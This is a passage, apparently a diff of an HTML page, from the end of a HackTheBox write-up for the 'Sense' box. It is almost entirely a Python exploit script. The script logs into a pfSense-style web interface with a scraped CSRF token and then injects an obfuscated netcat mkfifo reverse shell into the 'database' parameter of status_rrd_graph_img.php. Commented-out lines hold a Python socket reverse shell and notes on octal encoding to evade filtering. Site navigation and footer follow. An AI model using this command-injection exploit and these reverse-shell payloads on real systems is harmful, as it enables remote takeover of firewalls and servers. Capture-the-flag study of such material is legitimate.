+parser.add_argument(&quot;-user&quot;, help = &quot;UserName&quot;)                             
+parser.add_argument(&quot;-passwd&quot;, help = &quot;PassWord&quot;)                           
+args = parser.parse_args()                                                  
+                                                                                                                                                        #Arguements                                                                                                                                             
+rhost = args.rhost             
+lhost = args.lhost                                                                                                                                      
+lport = args.lport
+username = args.user    
+password = args.passwd   
+                                                                            
+#Variables                        
+rhost_url = ('https://' + rhost + '/index.php')                                                                                                         
+s = requests.session()         
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)          
+                                      
+#this parts pretty cool notice %s then at the end % then some arguements
+                                      
+#this will take everything after the . the cookie_text string.              
+re_csrf = 'csrfMagicToken = &quot;(.*?)&quot;'  
+                                      
+#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)   
+# for each line in password.txt run this else print failed                                                                                              
+r = s.post(rhost_url, verify=False)                                                                                                                     
+csrf = re.findall(re_csrf, r.text)[0]                                                                                                                   
+login = { '__csrf_magic': csrf,'usernamefld': username, 'passwordfld':                                                                                  
+        password,'login':'Login' }                                                                                                                      
+r = s.post(rhost_url, data=login, timeout=5)                                                                                                            
+
+netcat = &quot;&quot;&quot;x=$(printf &quot;\\55&quot;);rm ${HOME}tmp${HOME}f;mkfifo ${HOME}tmp${HOME}f;cat ${HOME}tmp${HOME}f|${HOME}bin${HOME}sh ${x}i 2&gt;&amp;1|nc %s %s &gt;${HOME}t$
+p${HOME}f&quot;&quot;&quot; % (lhost, lport)
+#isntead of using evniroment variables to run the script convert
+#to octal
+
+#Encoded_netcat = &quot;&quot;
+#for c in netcat:
+#    encoded_netcat += &quot;\\\\%03d&quot; % oct(ord(c))))
+#time.sleep(1)
+
+#payload = &quot;&quot;
+#for char in netcat:
+#    payload += ('\\' + oct(ord(char)).lstrip(&quot;0o&quot;))
+#netcat = &quot;&quot;&quot;x=$(printf &quot;\\55&quot;);python ${x}c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;%s&quot;,%s));os.du$
+2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;${HOME}bin${HOME}sh&quot;,&quot;${x}i&quot;]);'&quot;&quot;&quot; % (lhost, lport)
+           
+exploit_url = ('https://' + rhost + '/status_rrd_graph_img.php?database=queues;' + netcat )
+
+
+if &quot;Dashboard&quot; in r.text:
+    print(&quot;Valid Login %s:%s&quot; % (username,password))
+    try:
+        exploit = s.get(exploit_url, headers=s.headers, cookies=s.cookies, timeout=5)
+        if exploit.status_code:
+            print(&quot;nope&quot;)
+        else:
+            print(&quot;yay&quot;)
+         
+    except:
+        print(&quot;could not connect&quot;)
+        print(s.headers)
+        print(s.cookies)
+        print(s.request)
+ else:
+    print(&quot;Failed Login %s:%s&quot; % (username, password))
+    s.cookies.clear()
+# EXPLOIT 
+
+
+</code></pre>
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/secnotes/" title="SecNotes"> <i class="fa fa-chevron-left"></i><label>SecNotes</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/sizzle/" title="Sizzle" style="margin-right: 0px;"><label>Sizzle</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/sense.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
